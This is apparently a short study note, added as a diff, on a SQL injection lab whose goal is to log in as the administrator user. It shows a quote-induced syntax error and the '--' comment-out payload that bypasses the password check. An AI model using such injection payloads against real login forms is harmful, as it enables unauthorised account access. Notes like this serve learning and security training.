@@ -1,0 +1,18 @@
+SQL injection vulnerability in the login function.
+
+perform a SQL injection attack that logs in as the administrator user.
+
+
+Analysis
+
+Select firstName from users where firstName = 'administrator' and password ='admin'
+
+internel server error syntax error 
+Select firstName from users where firstName = ''' and password ='admin'
+
+internel server error syntax error 
+Select firstName from users where firstName = 'administrator'-- and password ='admin'
+
+process
+hacked 100%
+Select firstName from users where firstName = 'administrator'
